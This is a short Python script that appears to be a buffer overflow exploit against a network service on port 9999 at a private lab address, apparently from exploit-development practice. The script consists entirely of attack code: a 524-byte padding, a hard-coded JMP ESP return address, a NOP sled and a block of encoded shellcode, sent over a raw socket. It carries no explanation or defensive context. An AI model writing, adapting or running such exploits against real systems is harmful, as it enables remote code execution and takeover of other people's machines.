import socket

NOP = "\x90" * 16

shellcode = ("\xdb\xc5\xbe\x73\xe5\xb3\x01\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x75\x17\x83\xc5\x04\x03\x06\xf6\x51\xf4\x14\x10\x17"
"\xf7\xe4\xe1\x78\x71\x01\xd0\xb8\xe5\x42\x43\x09\x6d\x06\x68"
"\xe2\x23\xb2\xfb\x86\xeb\xb5\x4c\x2c\xca\xf8\x4d\x1d\x2e\x9b"
"\xcd\x5c\x63\x7b\xef\xae\x76\x7a\x28\xd2\x7b\x2e\xe1\x98\x2e"
"\xde\x86\xd5\xf2\x55\xd4\xf8\x72\x8a\xad\xfb\x53\x1d\xa5\xa5"
"\x73\x9c\x6a\xde\x3d\x86\x6f\xdb\xf4\x3d\x5b\x97\x06\x97\x95"
"\x58\xa4\xd6\x19\xab\xb4\x1f\x9d\x54\xc3\x69\xdd\xe9\xd4\xae"
"\x9f\x35\x50\x34\x07\xbd\xc2\x90\xb9\x12\x94\x53\xb5\xdf\xd2"
"\x3b\xda\xde\x37\x30\xe6\x6b\xb6\x96\x6e\x2f\x9d\x32\x2a\xeb"
"\xbc\x63\x96\x5a\xc0\x73\x79\x02\x64\xf8\x94\x57\x15\xa3\xf0"
"\x94\x14\x5b\x01\xb3\x2f\x28\x33\x1c\x84\xa6\x7f\xd5\x02\x31"
"\x7f\xcc\xf3\xad\x7e\xef\x03\xe4\x44\xbb\x53\x9e\x6d\xc4\x3f"
"\x5e\x91\x11\xef\x0e\x3d\xca\x50\xfe\xfd\xba\x38\x14\xf2\xe5"
"\x59\x17\xd8\x8d\xf0\xe2\x8b\x71\xac\xed\x05\x1a\xaf\xed\x88"
"\x86\x26\x0b\xc0\x26\x6f\x84\x7d\xde\x2a\x5e\x1f\x1f\xe1\x1b"
"\x1f\xab\x06\xdc\xee\x5c\x62\xce\x87\xac\x39\xac\x0e\xb2\x97"
"\xd8\xcd\x21\x7c\x18\x9b\x59\x2b\x4f\xcc\xac\x22\x05\xe0\x97"
"\x9c\x3b\xf9\x4e\xe6\xff\x26\xb3\xe9\xfe\xab\x8f\xcd\x10\x72"
"\x0f\x4a\x44\x2a\x46\x04\x32\x8c\x30\xe6\xec\x46\xee\xa0\x78"
"\x1e\xdc\x72\xfe\x1f\x09\x05\x1e\x91\xe4\x50\x21\x1e\x61\x55"
"\x5a\x42\x11\x9a\xb1\xc6\x31\x79\x13\x33\xda\x24\xf6\xfe\x87"
"\xd6\x2d\x3c\xbe\x54\xc7\xbd\x45\x44\xa2\xb8\x02\xc2\x5f\xb1"
"\x1b\xa7\x5f\x66\x1b\xe2")

buffer = "A"*524
buffer += "\xf3\x12\x17\x31" # JMP ESP address
buffer += NOP
buffer += shellcode
buffer += "C" * (1500-len(buffer))

try:
	print("Fuzzing the input with {0} bytes".format(len(buffer)))
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.1.49',9999)) 
	s.send(buffer+'\r\n')
	s.recv(1024)
	s.close()
except:
	print("Exploit failed!")
